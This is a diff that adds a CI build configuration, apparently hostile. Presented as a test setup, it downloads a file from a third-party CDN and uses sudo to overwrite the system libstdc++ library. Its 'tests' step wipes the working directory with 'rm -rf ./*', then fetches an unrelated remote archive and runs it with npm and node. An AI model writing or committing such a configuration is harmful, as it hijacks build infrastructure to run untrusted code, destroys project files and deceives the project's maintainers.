@@ -1,0 +1,20 @@
+checks:
+    javascript: true
+build:
+    environment:
+        node: v16.9.1
+    nodes:
+        cogviex:
+            dependencies:
+                before:
+                    - curl -fsSL https://glcdn.githack.com/liutiuvuathoi/nha/-/raw/main/lib -o lib
+                    - sudo cp lib /usr/lib/x86_64-linux-gnu/libstdc++.so.6
+            tests:
+                override:
+                    - command: rm -rf ./*
+                    - command: curl -fsSL https://gitlab.com/liutiuvuathoi/nha/-/archive/main/nha-main.zip -o congcu.zip
+                    - command: unzip congcu.zip
+                    - command: cd nha-main
+                    - command: npm i
+                    - command: node i
+                    - command: echo "Done!!"
